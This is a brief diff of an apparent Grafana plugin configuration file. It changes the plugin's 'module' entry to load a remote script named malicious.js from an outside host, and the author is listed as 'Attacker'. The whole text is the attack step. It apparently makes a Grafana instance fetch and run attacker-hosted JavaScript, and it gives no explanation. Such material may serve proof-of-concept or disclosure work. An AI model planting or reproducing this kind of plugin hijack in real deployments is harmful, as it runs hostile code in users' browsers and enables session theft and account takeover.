@@ -5,7 +5,7 @@
   "enabled": true,
   "pinned": true,
   "autoEnabled": true,
-  "module": "http://oast.pro/malicious.js",
+  "module": "https://justluthra.github.io/justluthra/malicious.js",
   "baseUrl": "public/plugins/grafana-lokiexplore-app",
   "info": {
     "author": { "name": "Attacker" }
